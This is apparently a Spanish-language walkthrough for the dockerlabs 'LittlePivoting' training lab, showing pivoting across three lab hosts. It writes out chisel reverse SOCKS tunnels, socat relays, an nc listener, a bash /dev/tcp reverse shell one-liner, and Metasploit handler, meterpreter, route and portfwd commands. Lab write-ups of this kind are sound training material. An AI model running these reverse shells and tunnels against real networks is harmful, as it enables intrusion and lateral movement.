# dockerlabs.es "LittlePivoting"





Attacker:
10.10.10.1

Inclusion:
10.10.10.2 20.20.20.2                                                                                                                                         
Trust:
20.20.20.3 30.30.30.2                                                                   

Upload:
30.30.30.3   
















## 1. Usando `chisel` and `socat`

### Paso 1

1.1 Attacker machine:
```
chisel server --reverse -p 1111
echo -e "socks5\t 127.0.0.1 1080" | sudo tee /etc/proxychains4.conf
```

1.2 Inclusion:
```
chisel client 10.10.10.1:1111 R:socks
```



### Paso 2
2.1 Inclusion:
```
socat TCP-LISTEN:2222,fork TCP:10.10.10.1:1111
```


2.2 Attacker:
```
echo -e "socks5\t127.0.0.1 2222" | sudo tee /etc/proxychains4.conf
```

2.3 Trust:
```
chisel client 20.20.20.2:2222 R:2222:socks
```





### Paso 3

3.1 Trust:
```
socat TCP-LISTEN:3333,fork TCP:20.20.20.2:4444
```

3.2 Inclusion:
```
socat TCP-LISTEN:4444,fork TCP:10.10.10.1:5555
```


3.3 Attacker:
```
nc -lvnp 5555
```


3.4 Trust:
Subir el payload a  `http://30.30.30.3/upload.php` para inicial una reverse shell a Upload (30.30.30.2:3333) que recibiremos en nuestra Attacker machine en el puerto 5555.
























## 2. Usando Metasploit


### Paso 1

1.1 Attacker (Metasploit):
```
msf6 exploit(multi/handler) > use multi/handler
msf6 exploit(multi/handler) > set LHOST 10.10.10.1
msf6 exploit(multi/handler) > set LPORT 1111
msf6 exploit(multi/handler) > run
```


1.2 Inclusion
```
bash -i >& /dev/tcp/10.10.10.1/1111 0>&1;
```


1.3 Attacker (Metasploit):
Una vez estblecida la conexiÃ³n:
```
> background
```

Checkeamos el ID de nuestra session y luego elevamos la session a meterpreter:
```
msf6 exploit(multi/handler) > sessions -l
...

1 shell sparc/bsd   Shell Banner: root@c77fe68f3854:...
...

msf6 exploit(multi/handler) > sessions -u -1
```
[SNAPSHOT ACA]



Luego agregamos la ruta:
```
msf6 exploit(multi/handler) > route add 20.20.20.2 255.255.255.0 2
```

Y hacemos port forwarding para poder acceder desde Attacker a Trust:
```
msf6 exploit(multi/handler) > sessions 2
meterpreter > portfwd add -l 1080 -p 80 -r 20.20.20.3
meterpreter > portfwd add -l 1022 -p 22 -r 20.20.20.3
```





### Paso 2

2.1 Attacker:
En una nueva shell ahora podremos acceder a Trust, ya que estamos usando a Inclusion como pivot:
```
ssh mario@127.0.0.1 -p 1022
```






































```